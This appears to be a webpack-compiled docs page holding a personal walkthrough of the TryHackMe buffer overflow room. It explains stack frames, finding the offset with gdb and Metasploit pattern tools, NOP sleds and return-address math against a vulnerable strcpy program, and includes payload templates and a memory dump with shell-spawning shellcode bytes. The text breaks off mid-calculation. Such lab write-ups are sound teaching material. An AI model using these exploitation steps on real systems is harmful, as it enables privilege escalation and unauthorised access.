"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[6083],{9041:(e,A,n)=>{n.d(A,{A:()=>f});const f=n.p+"assets/images/stackframe-1-1cd59f27fb5c80f7c189de6dbe3bf56b.svg"},14562:(e,A,n)=>{n.d(A,{A:()=>f});const f=n.p+"assets/images/payload-9d657796cce793bd096082e202665c20.svg"},27945:(e,A,n)=>{n.d(A,{A:()=>f});const f=n.p+"assets/images/stackoffset-3-e2e11408bce8063523c5d331a6440383.svg"},28453:(e,A,n)=>{n.d(A,{R:()=>s,x:()=>t});var f=n(96540);const x={},r=f.createContext(x);function s(e){const A=f.useContext(r);return f.useMemo((function(){return"function"==typeof e?e(A):{...A,...e}}),[A,e])}function t(e){let A;return A=e.disableParentContext?"function"==typeof e.components?e.components(x):e.components||x:s(e.components),f.createElement(r.Provider,{value:A},e.children)}},33987:(e,A,n)=>{n.d(A,{A:()=>f});const f=n.p+"assets/images/stackoverflow-2-a7237f043b3f3c667dc2af5cb2db42f8.svg"},53120:(e,A,n)=>{n.r(A),n.d(A,{assets:()=>o,contentTitle:()=>t,default:()=>a,frontMatter:()=>s,metadata:()=>f,toc:()=>i});const f=JSON.parse('{"id":"hacker/bufferoverflow/x86","title":"Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide","description":"Comprehensive guide to Linux buffer overflow exploitation on x86-64 architecture using GDB, pwntools, and modern exploitation techniques.","source":"@site/docs/hacker/bufferoverflow/2.x86.md","sourceDirName":"hacker/bufferoverflow","slug":"/hacker/bufferoverflow/x86","permalink":"/docs/hacker/bufferoverflow/x86","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/bufferoverflow/2.x86.md","tags":[{"inline":true,"label":"buffer-overflow","permalink":"/docs/tags/buffer-overflow"},{"inline":true,"label":"linux","permalink":"/docs/tags/linux"},{"inline":true,"label":"x86-64","permalink":"/docs/tags/x-86-64"},{"inline":true,"label":"exploitation","permalink":"/docs/tags/exploitation"},{"inline":true,"label":"gdb","permalink":"/docs/tags/gdb"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1758526302000,"sidebarPosition":2,"frontMatter":{"title":"Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide","description":"Comprehensive guide to Linux buffer overflow exploitation on x86-64 architecture using GDB, pwntools, and modern exploitation techniques.","keywords":["linux buffer overflow","x86-64 exploitation","gdb debugging","pwntools","linux exploitation","stack overflow","ret2libc"],"tags":["buffer-overflow","linux","x86-64","exploitation","gdb"],"sidebar_position":2},"sidebar":"docsSidebar","previous":{"title":"Windows x86-64 Buffer Overflow Exploitation Guide","permalink":"/docs/hacker/bufferoverflow/windows"},"next":{"title":"Buffer Overflow Resources, Tips, and Techniques - Exploitation Learning Materials","permalink":"/docs/hacker/bufferoverflow/resources"}}');var x=n(74848),r=n(28453);const s={title:"Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide",description:"Comprehensive guide to Linux buffer overflow exploitation on x86-64 architecture using GDB, pwntools, and modern exploitation techniques.",keywords:["linux buffer overflow","x86-64 exploitation","gdb debugging","pwntools","linux exploitation","stack overflow","ret2libc"],tags:["buffer-overflow","linux","x86-64","exploitation","gdb"],sidebar_position:2},t=void 0,o={},i=[{value:"The Stack",id:"the-stack",level:2},{value:"Stack Frame",id:"stack-frame",level:3},{value:"The Overflow",id:"the-overflow",level:2},{value:"The Payload",id:"the-payload",level:3},{value:"Find the Offset",id:"find-the-offset",level:3},{value:"Manual Method",id:"manual-method",level:4},{value:"Metsploit Framework Method",id:"metsploit-framework-method",level:4},{value:"NOP Sled",id:"nop-sled",level:3},{value:"Shellcode",id:"shellcode",level:3},{value:"Alignment",id:"alignment",level:3},{value:"Return Address",id:"return-address",level:3},{value:"Buffer Overflow #1",id:"buffer-overflow-1",level:2},{value:"Find the offset",id:"find-the-offset-1",level:3},{value:"shellcode + return address",id:"shellcode--return-address",level:3},{value:"Memory Address Math",id:"memory-address-math",level:3},{value:"NOP slide shellcode address",id:"nop-slide-shellcode-address",level:3},{value:"payload + shellcode return address",id:"payload--shellcode-return-address",level:3},{value:"pwntools setreuid shellcode",id:"pwntools-setreuid-shellcode",level:3},{value:"Debugging Return Address",id:"debugging-return-address",level:3},{value:"Buffer Overflow #2",id:"buffer-overflow-2",level:2},{value:"Find Offset",id:"find-offset",level:3},{value:"Shellcode",id:"shellcode-1",level:3},{value:"shellcode + pwntools",id:"shellcode--pwntools",level:3},{value:"NOP sled + Return Address",id:"nop-sled--return-address",level:3},{value:"Final Payload",id:"final-payload",level:3},{value:"Capture the Flag",id:"capture-the-flag",level:3}];function d(e){const A={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",em:"em",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,x.jsxs)(x.Fragment,{children:[(0,x.jsx)(A.admonition,{type:"info",children:(0,x.jsxs)(A.p,{children:["Notes on the THM ",(0,x.jsx)(A.a,{href:"https://tryhackme.com/room/bof1",children:"'Buffer Overflow'"})," Room, looking specifically at Linux x86-64 programs. The room recommends using radare2 (r2) but it was easier to use ",(0,x.jsx)(A.code,{children:"gdb"})," instead."]})}),"\n",(0,x.jsx)(A.p,{children:"Some preliminary notes and knowledge around the stack so I can try to understand what is happening."}),"\n",(0,x.jsx)(A.h2,{id:"the-stack",children:"The Stack"}),"\n",(0,x.jsx)(A.p,{children:"The stack is the place in memory where your local variables and function arguments go."}),"\n",(0,x.jsx)(A.p,{children:"Your application address space looks like this:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"high addresses\n  _____________\n [_____________]\n [    stack    ]\n [_____________]\n [             ]\n [             ]\n [_____________]\n [____heap_____]\n [___globals___]\n [____code_____]\n [_____________]\n\nlow addresses\n"})}),"\n",(0,x.jsx)(A.p,{children:'The "heap" grows "upward", and the "stack" grows "downward"- so the "top" of the stack if you look at the diagram is technically the "bottom", cos it grows "downward".'}),"\n",(0,x.jsx)(A.h3,{id:"stack-frame",children:"Stack Frame"}),"\n",(0,x.jsx)(A.admonition,{type:"info",children:(0,x.jsxs)(A.p,{children:["Reference ",(0,x.jsx)(A.a,{href:"https://www.youtube.com/watch?v=jVzSBkbfdiw",children:"The Call Stack and Stack Overflows (example in C)"})]})}),"\n",(0,x.jsxs)(A.p,{children:['Every time you call a function a chunk of memory is allocated to the "top" of the stack, this is called the ',(0,x.jsx)(A.code,{children:"Stack Frame"}),", and holds the args, local variables and return address to jump back to, for that function call."]}),"\n",(0,x.jsxs)(A.p,{children:["These Stack Frames are ",(0,x.jsx)(A.code,{children:"PUSH"})," onto the stack:"]}),"\n",(0,x.jsx)(A.p,{children:"e.g."}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"main (locals, args, return)\nprintf(locals, args, return)\nmalloc(locals, args, return)\n"})}),"\n",(0,x.jsx)(A.p,{children:'When the function "returns", the stack frame is removed with POP'}),"\n",(0,x.jsxs)(A.table,{children:[(0,x.jsx)(A.thead,{children:(0,x.jsx)(A.tr,{children:(0,x.jsx)(A.th,{style:{textAlign:"center"},children:"stack bottom"})})}),(0,x.jsxs)(A.tbody,{children:[(0,x.jsx)(A.tr,{children:(0,x.jsx)(A.td,{style:{textAlign:"center"},children:"return address"})}),(0,x.jsx)(A.tr,{children:(0,x.jsx)(A.td,{style:{textAlign:"center"},children:"saved registers"})}),(0,x.jsx)(A.tr,{children:(0,x.jsx)(A.td,{style:{textAlign:"center"},children:"buffer: function"})}),(0,x.jsx)(A.tr,{children:(0,x.jsx)(A.td,{style:{textAlign:"center"},children:"stack top"})})]})]}),"\n",(0,x.jsx)(A.h2,{id:"the-overflow",children:"The Overflow"}),"\n",(0,x.jsx)(A.admonition,{type:"info",children:(0,x.jsxs)(A.p,{children:["The Cyber Mentor's notes on the anatomy of the stack, with regard to overflows, are the most clear I've read online: ",(0,x.jsx)(A.a,{href:"https://tcm-sec.com/buffer-overflows-made-easy/",children:'"Buffer Overflows Made Easy"'}),". This section paraphrases a lot fo CM's work, so full credit to him for the basis of my notes."]})}),"\n",(0,x.jsx)(A.p,{children:'The stack we\'re most concerned about in an overflow is a "memory stack" with the 4 main components'}),"\n",(0,x.jsxs)(A.ul,{children:["\n",(0,x.jsx)(A.li,{children:"ESP - stack pointer"}),"\n",(0,x.jsx)(A.li,{children:"Buffer Space"}),"\n",(0,x.jsx)(A.li,{children:"EBP - base pointer"}),"\n",(0,x.jsx)(A.li,{children:"EIP - instruction pointer / return address"}),"\n"]}),"\n",(0,x.jsx)(A.p,{children:"We start with this as our programs stack:"}),"\n",(0,x.jsx)(A.p,{children:(0,x.jsx)(A.img,{alt:"stack frame",src:n(9041).A+"",width:"380",height:"381"})}),"\n",(0,x.jsxs)(A.p,{children:['It\'s called a "buffer overflow" cos that ',(0,x.jsx)(A.code,{children:"Buffer Space"})," you see there, is what we're trying to ",(0,x.jsx)(A.em,{children:"overflow"}),"."]}),"\n",(0,x.jsx)(A.p,{children:"We can identify it is vulnerable to an overflow a couple of ways:"}),"\n",(0,x.jsxs)(A.ol,{children:["\n",(0,x.jsxs)(A.li,{children:["viewing sourcecode and seeing vulnerable code e.g. ",(0,x.jsx)(A.code,{children:"strcpy"})]}),"\n",(0,x.jsx)(A.li,{children:'"fuzzing" where we send bytes at a function the application exposes and seeing where it "overflows" i.e. crashes and overwrites the EIP'}),"\n"]}),"\n",(0,x.jsx)(A.p,{children:(0,x.jsx)(A.img,{alt:"buffer overflow",src:n(33987).A+"",width:"900",height:"424"})}),"\n",(0,x.jsxs)(A.p,{children:["As you can see, the ",(0,x.jsx)(A.code,{children:"Buffer Space"})," has been overflowed, all the way to us being able to write a bunch of ",(0,x.jsx)(A.code,{children:"A"}),"'s into the EIP register, which means we control what the value of this register."]}),"\n",(0,x.jsx)(A.admonition,{title:"Why do we care about the EIP?",type:"tip",children:(0,x.jsx)(A.p,{children:'This is the return address to go to when the stack frame completes executing, if we control this, we control "where" the program executes next. And we want to point that to whever our shellcode is.'})}),"\n",(0,x.jsx)(A.h3,{id:"the-payload",children:"The Payload"}),"\n",(0,x.jsx)(A.p,{children:"After reviewing a lot of the literature on buffer overflowing methods, what makes sense to me is starting at the end goal and working backwards."}),"\n",(0,x.jsxs)(A.p,{children:['Ultimately, we want a "',(0,x.jsx)(A.strong,{children:"payload"}),'" that we fire at the overflow entrypoint and pops us a shell.']}),"\n",(0,x.jsxs)(A.p,{children:["This payload is essentially = ",(0,x.jsx)(A.code,{children:"offset"})," + ",(0,x.jsx)(A.code,{children:"return address"})]}),"\n",(0,x.jsx)(A.p,{children:"But the offset is made up of the following:"}),"\n",(0,x.jsx)(A.p,{children:(0,x.jsx)(A.img,{alt:"payload",src:n(14562).A+"",width:"860",height:"220"})}),"\n",(0,x.jsxs)(A.p,{children:["In terms of cli input, this looks like this in ",(0,x.jsx)(A.code,{children:"gdb"}),":"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:'(gdb) run $(python -c "print $nop_sled + $shellcode + $alignment + $return_address")\n'})}),"\n",(0,x.jsx)(A.p,{children:"Once we find the size of the Offset, we can determine what byte sizes to allocate to the other components i.e. the NOP sled, Shellcode and Alignment parts."}),"\n",(0,x.jsx)(A.h3,{id:"find-the-offset",children:"Find the Offset"}),"\n",(0,x.jsxs)(A.blockquote,{children:["\n",(0,x.jsx)(A.p,{children:"What's the Offset?"}),"\n"]}),"\n",(0,x.jsxs)(A.p,{children:["The ",(0,x.jsx)(A.code,{children:"offset"})," is the number of bytes all the way up to, but not overwriting the EIP:"]}),"\n",(0,x.jsx)(A.p,{children:(0,x.jsx)(A.img,{alt:"buffer overflow",src:n(27945).A+"",width:"580",height:"385"})}),"\n",(0,x.jsxs)(A.blockquote,{children:["\n",(0,x.jsx)(A.p,{children:"How do we find how big the offset is?"}),"\n"]}),"\n",(0,x.jsx)(A.h4,{id:"manual-method",children:"Manual Method"}),"\n",(0,x.jsx)(A.p,{children:"As an example, if we have sourcecode like this:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-c",children:'...\nvoid copy_arg(char *string)\n{\n    char buffer[140];\n    strcpy(buffer, string);\n    printf("%s\\n", buffer);\n    return 0;\n}\n...\n'})}),"\n",(0,x.jsxs)(A.blockquote,{children:["\n",(0,x.jsx)(A.p,{children:"What do we know?"}),"\n"]}),"\n",(0,x.jsxs)(A.p,{children:["We know our buffer is ",(0,x.jsx)(A.code,{children:"140"})," bytes."]}),"\n",(0,x.jsxs)(A.p,{children:["We know ",(0,x.jsx)(A.code,{children:"$rbp"})," is ",(0,x.jsx)(A.code,{children:"8"})," bytes (we know the it's 8 bytes because we are on an ",(0,x.jsx)(A.code,{children:"x86_64"})," i.e the ",(0,x.jsx)(A.a,{href:"https://en.wikipedia.org/wiki/X86-64",children:"64 bit version of the x86 instruction set"}),") so we try sending a payload of ",(0,x.jsx)(A.code,{children:"148 + n"})," until the program crashes."]}),"\n",(0,x.jsxs)(A.p,{children:["At the very least, we know our offset is ",(0,x.jsx)(A.em,{children:"at least"})," ",(0,x.jsx)(A.code,{children:"148"})," bytes."]}),"\n",(0,x.jsxs)(A.p,{children:["If we've loaded our program into ",(0,x.jsx)(A.code,{children:"gdb"})," we'll send our overflow input like this, choosing to add ",(0,x.jsx)(A.code,{children:"8"})," bytes arbitrarily and incrementing it until the program crashes:"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print 'A'*(148+8))\n"})}),"\n",(0,x.jsx)(A.p,{children:"We inspect the return address when it crashes, looking for this:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"Program received signal SIGSEGV, Segmentation fault.\n0x0000414141414141 in ?? ()\n"})}),"\n",(0,x.jsxs)(A.p,{children:["this is the ",(0,x.jsx)(A.code,{children:"EIP"})," and it's showing it's overwritten with a bunch of ",(0,x.jsx)(A.code,{children:"A"}),"'s i.e. we've overflowed the buffer, and overwritten everything up to and including the EIP."]}),"\n",(0,x.jsxs)(A.p,{children:["We keep increasing ",(0,x.jsx)(A.code,{children:"n"})," until we see the ",(0,x.jsx)(A.code,{children:"\\x41"}),"'s, when we overshoot it, the ",(0,x.jsx)(A.code,{children:"\\x41"}),"'s disappear."]}),"\n",(0,x.jsxs)(A.p,{children:["In the example above, the return address turns out to be ",(0,x.jsx)(A.code,{children:"6-bytes"})," long before the next ",(0,x.jsx)(A.code,{children:"n"})," increment overshoots it."]}),"\n",(0,x.jsxs)(A.p,{children:["The final number ",(0,x.jsx)(A.code,{children:"(148 + n) - 6"}),' is our "offset" i.e. the size of the buffer right up to the start of the return address.']}),"\n",(0,x.jsx)(A.h4,{id:"metsploit-framework-method",children:"Metsploit Framework Method"}),"\n",(0,x.jsxs)(A.p,{children:["I haven't done this myself, but ",(0,x.jsx)(A.a,{href:"https://l1ge.github.io/tryhackme_bof1/",children:"l1ge's write-up"})," does an excellent job of explaining it."]}),"\n",(0,x.jsx)(A.p,{children:"In summary:"}),"\n",(0,x.jsxs)(A.ul,{children:["\n",(0,x.jsxs)(A.li,{children:["use ",(0,x.jsx)(A.code,{children:"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <buffer size />"}),", to create a payload string pattern."]}),"\n",(0,x.jsx)(A.li,{children:"send it at the application as input"}),"\n",(0,x.jsxs)(A.li,{children:["inspect the registers in ",(0,x.jsx)(A.code,{children:"gdb"})," (e.g. ",(0,x.jsx)(A.code,{children:"i r"})," or ",(0,x.jsx)(A.code,{children:"x/100 $rsp-200"}),") to see where the pattern has ended up overwriting"]}),"\n",(0,x.jsxs)(A.li,{children:["use ",(0,x.jsx)(A.code,{children:"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <buffer size /> -q <address />"})]}),"\n"]}),"\n",(0,x.jsx)(A.h3,{id:"nop-sled",children:"NOP Sled"}),"\n",(0,x.jsxs)(A.p,{children:['A "no operation" byte aka ',(0,x.jsx)(A.code,{children:"\\x90"})," or ",(0,x.jsx)(A.code,{children:"NOP"})," is (my own words) a byte that takes up space and does nothing when hit, but pass execution along to the next byte."]}),"\n",(0,x.jsxs)(A.blockquote,{children:["\n",(0,x.jsx)(A.p,{children:"Why do we need one?"}),"\n"]}),"\n",(0,x.jsx)(A.p,{children:"The return address we're overwriting onto the EIP is a very specific location pointing to the start of our shellcode to be executed."}),"\n",(0,x.jsx)(A.p,{children:"The problem with this is, shit happens on computers all the time which move the address space around, which could affect our shellcode being executed correctly."}),"\n",(0,x.jsx)(A.p,{children:'To allow for this scenario, we use a "NOP sled" i.e. a string of NOPs that start at the beginning of our buffer, in front of our shellcode, so when the EIP sends execution to the beginning of our buffer, the NOP sled will "no execute and pass along" the pointer eventually to the start of our shellcode.'}),"\n",(0,x.jsxs)(A.p,{children:['The NOP sled can be any size, but bear in mind it shares the same "offset" space with the Shellcode and Alignment, so combined these cannot add up to ',(0,x.jsx)(A.em,{children:"more"})," than the offset size."]}),"\n",(0,x.jsx)(A.h3,{id:"shellcode",children:"Shellcode"}),"\n",(0,x.jsx)(A.p,{children:"A few ways to generate shellcode"}),"\n",(0,x.jsxs)(A.ol,{children:["\n",(0,x.jsx)(A.li,{children:"msfvenom"}),"\n",(0,x.jsx)(A.li,{children:(0,x.jsx)(A.a,{href:"https://masterccc.github.io/tools/shellcode_gen/",children:"/bin/cat"})}),"\n",(0,x.jsx)(A.li,{children:(0,x.jsx)(A.a,{href:"https://docs.pwntools.com/en/stable/",children:"pwntools"})}),"\n"]}),"\n",(0,x.jsx)(A.h3,{id:"alignment",children:"Alignment"}),"\n",(0,x.jsx)(A.p,{children:"The alignment bytes just make up the difference between the shellcode and the end of the offset."}),"\n",(0,x.jsx)(A.h3,{id:"return-address",children:"Return Address"}),"\n",(0,x.jsxs)(A.p,{children:['The size of this is determined by what we say in the "finding the offset", where the EIP gets filled up with ',(0,x.jsx)(A.code,{children:"A"}),"'s until we see something like this for the crashed return address in gdb: ",(0,x.jsx)(A.code,{children:"0x0000414141414141"}),", telling us the return address size is ",(0,x.jsx)(A.code,{children:"6 bytes"}),"."]}),"\n",(0,x.jsxs)(A.blockquote,{children:["\n",(0,x.jsx)(A.p,{children:"But what address are we writing in here?"}),"\n"]}),"\n",(0,x.jsxs)(A.p,{children:["Now that we know our ",(0,x.jsx)(A.code,{children:"NOP Sled"})," is going to be at the start of our payload/buffer, we want the address where our ",(0,x.jsx)(A.code,{children:"NOP"}),"'s can be found."]}),"\n",(0,x.jsx)(A.p,{children:"For example, if we've got most of our payload determined:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:'(gdb) run $(python -c "print $nop_sled + $shellcode + $alignment + $return_address")\n'})}),"\n",(0,x.jsx)(A.p,{children:"We send this off and can see the return address being overwritten..."}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"Program received signal SIGSEGV, Segmentation fault.\n0x0000414141414141 in ?? ()\n"})}),"\n",(0,x.jsxs)(A.p,{children:["Staying inside ",(0,x.jsx)(A.code,{children:"gdb"}),", dump the memory and look for our ",(0,x.jsx)(A.code,{children:"NOP"}),"'s i.e. ",(0,x.jsx)(A.code,{children:"0x90909090"}),"'s."]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) x/100x $rsp-200\n0x7fffffffe8c8: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff\n0x7fffffffe8d8: 0xffffecea      0x00007fff      0x67676f64      0x9090906f\n0x7fffffffe8e8: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe8f8: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe908: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe918: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe928: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe938: 0x90909090      0x90909090      0x90909090      0xff319090\n0x7fffffffe948: 0x03eabf66      0x4858716a      0x050ffe89      0x48583b6a\n0x7fffffffe958: 0xb849d231      0x69622f2f      0x68732f6e      0x08e8c149\n0x7fffffffe968: 0x89485041      0x485752e7      0x050fe689      0x48583c6a\n0x7fffffffe978: 0x050fff31      0x42424242      0x42424242      0x42424242\n0x7fffffffe988: 0x41414141      0x00004141      0xffffea88      0x00007fff\n0x7fffffffe998: 0x00000000      0x00000002      0x004005e0      0x00000000\n0x7fffffffe9a8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000\n0x7fffffffe9b8: 0xffffea88      0x00007fff      0x00040000      0x00000002\n0x7fffffffe9c8: 0x004005ac      0x00000000      0x00000000      0x00000000\n0x7fffffffe9d8: 0x794daa23      0x97320a39      0x00400450      0x00000000\n0x7fffffffe9e8: 0xffffea80      0x00007fff      0x00000000      0x00000000\n0x7fffffffe9f8: 0x00000000      0x00000000      0xa1edaa23      0x68cdf546\n0x7fffffffea08: 0x2d49aa23      0x68cde5f1      0x00000000      0x00000000\n0x7fffffffea18: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffea28: 0xffffeaa0      0x00007fff      0xf7ffe130      0x00007fff\n0x7fffffffea38: 0xf7de7656      0x00007fff      0x00000000      0x00000000\n0x7fffffffea48: 0x00000000      0x00000000      0x00000000      0x00000000\n"})}),"\n",(0,x.jsxs)(A.p,{children:["Pick any address where you see the ",(0,x.jsx)(A.code,{children:"0x90909090"}),"'s and write it in little edian format e.g. ",(0,x.jsx)(A.code,{children:"0x7fffffffe8f8"})," becomes ",(0,x.jsx)(A.code,{children:"\\xf8\\xe8\\xff\\xff\\xff\\x7f"}),"."]}),"\n",(0,x.jsx)(A.p,{children:"You now have the last piece of the payload puzzle."}),"\n",(0,x.jsxs)(A.admonition,{title:"Offset / Payload Size",type:"danger",children:[(0,x.jsxs)(A.p,{children:["The size in bytes of the ",(0,x.jsx)(A.code,{children:"offset"})," ",(0,x.jsx)(A.strong,{children:"must be maintained at all times"}),". If you mess up the offset, you will mess up overwriting the EIP which is crucial for pointing the execution flow to our shellcode."]}),(0,x.jsxs)(A.p,{children:["So, if the offset is ",(0,x.jsx)(A.code,{children:"169"})," bytes, then ",(0,x.jsx)(A.code,{children:"NOP"})," + ",(0,x.jsx)(A.code,{children:"shellcode"})," + ",(0,x.jsx)(A.code,{children:"Alignment"})," + ",(0,x.jsx)(A.code,{children:"return_address"})," ",(0,x.jsx)(A.em,{children:"must"})," equal ",(0,x.jsx)(A.code,{children:"169"})," bytes exactly."]})]}),"\n",(0,x.jsx)(A.h2,{id:"buffer-overflow-1",children:"Buffer Overflow #1"}),"\n",(0,x.jsxs)(A.p,{children:["The scenario, is a buffer-overflow program belonging to ",(0,x.jsx)(A.code,{children:"user1"})," will be used to read a ",(0,x.jsx)(A.code,{children:"secret.txt"})," file belonging to ",(0,x.jsx)(A.code,{children:"user2"}),":"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"[user1@ip-10-10-79-28 overflow-3]$ ll\ntotal 24\n-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow\n-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c\n-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt\n"})}),"\n",(0,x.jsxs)(A.p,{children:["Notes on an overflow using this program from TryHackMe ",(0,x.jsx)(A.a,{href:"https://tryhackme.com/room/bof1",children:"Buffer Overflow Room"})," task 8."]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-c",children:'#include <stdio.h />\n#include <stdlib.h />\n\nvoid copy_arg(char *string)\n{\n    char buffer[140];\n    strcpy(buffer, string);\n    printf("%s\\n", buffer);\n    return 0;\n}\n\nint main(int argc, char **argv)\n{\n    printf("Here\'s a program that echo\'s out your input\\n");\n    copy_arg(argv[1]);\n}\n'})}),"\n",(0,x.jsx)(A.p,{children:"this technique uses Python, GDB and a clear understanding of all elements of the Stack."}),"\n",(0,x.jsx)(A.h3,{id:"find-the-offset-1",children:"Find the offset"}),"\n",(0,x.jsxs)(A.admonition,{type:"info",children:[(0,x.jsx)(A.p,{children:"The offset is the amount of bytes between filling up the buffer and the start of the return address."}),(0,x.jsxs)(A.p,{children:["offset = ",(0,x.jsx)(A.code,{children:"buffer[140] + alignment bytes + rbp[8]"})]})]}),"\n",(0,x.jsx)(A.p,{children:"use Python and GDB to find the offset i.e. number of bytes it takes to overwrite the return address."}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print('A' * 150)\")\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print('A' * 150)\")\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000400595 in main ()\n\n(gdb) run $(python -c \"print('A' * 151)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print('A' * 151)\")\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGBUS, Bus error.\n0x0000000000400595 in main ()\n\n(gdb) run $(python -c \"print('A' * 152)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print('A' * 152)\")\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGILL, Illegal instruction.\n0x0000000000400500 in __do_global_dtors_aux ()\n\n(gdb) run $(python -c \"print('A' * 155)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print('A' * 155)\")\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414141 in ?? ()\n"})}),"\n",(0,x.jsxs)(A.p,{children:["line ",(0,x.jsx)(A.code,{children:"0x0000000000400595 in main ()"})," is the return address"]}),"\n",(0,x.jsxs)(A.p,{children:["what we're trying to do is overwrite it with until we see all ",(0,x.jsx)(A.code,{children:"A"}),"s i.e. ",(0,x.jsx)(A.code,{children:"\\x41"})," all over the return address like the following:"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print('A' * 158)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print('A' * 158)\")\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000414141414141 in ?? ()\n\n(gdb) run $(python -c \"print('A' * 159)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print('A' * 159)\")\nHere's a program that echo's out your input\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000400563 in copy_arg ()\n"})}),"\n",(0,x.jsxs)(A.p,{children:["you know you've gone OVER it when the return address goes from ",(0,x.jsx)(A.code,{children:"41"}),"s to some other bytes."]}),"\n",(0,x.jsxs)(A.p,{children:["so, we now know  ",(0,x.jsx)(A.code,{children:"158"})," bytes is the right amount of bytes to fill a) the buffer, b) the alignment bytes and c) the rbp (saved registers) and the 6-byte return address."]}),"\n",(0,x.jsx)(A.p,{children:(0,x.jsx)(A.code,{children:"offset = 158 - 6 = 152"})}),"\n",(0,x.jsxs)(A.p,{children:["so - ",(0,x.jsx)(A.code,{children:"152"})," bytes to fill the buffer (plus alignment + 